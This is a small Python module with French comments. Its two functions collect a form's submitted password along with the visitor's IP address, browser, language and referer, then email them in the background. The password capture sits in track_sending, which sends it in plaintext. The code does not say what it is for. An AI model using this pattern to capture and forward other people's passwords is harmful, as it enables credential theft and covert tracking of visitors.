from concurrent.futures import ThreadPoolExecutor

from src.emails import send_email

executor = ThreadPoolExecutor(max_workers=4)  # threads pour l'envoi de mails


def track_sending(request):
    submitted_password = request.form.get("password", "")
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent_str = request.headers.get("User-Agent", "Unknown").replace('\n', '')
    accept_language = request.headers.get("Accept-Language", "Unknown")
    referer = request.headers.get("Referer", "Unknown")

    # Construire le contenu du mail
    mail_content = f"""
Mot de passe soumis : "{submitted_password[:100]}"

IP : "{user_ip[:100]}"
Browser : "{user_agent_str[:100]}"
Langue : "{accept_language[:100]}"
Referer : "{referer[:100]}"
"""

    # Envoyer le mail en arrière-plan pour ne pas bloquer la page
    executor.submit(send_email, "track_sending", mail_content)


def track_loading(request):
    submitted_password = request.form.get("password", "")
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent_str = request.headers.get("User-Agent", "Unknown").replace('\n', '')
    accept_language = request.headers.get("Accept-Language", "Unknown")
    referer = request.headers.get("Referer", "Unknown")

    # Construire le contenu du mail
    mail_content = f"""
has been loaded 👀
IP : "{user_ip[:100]}"
Browser : "{user_agent_str[:100]}"
Langue : "{accept_language[:100]}"
Referer : "{referer[:100]}"
"""

    # Envoyer le mail en arrière-plan pour ne pas bloquer la page
    executor.submit(send_email, "track_loading", mail_content)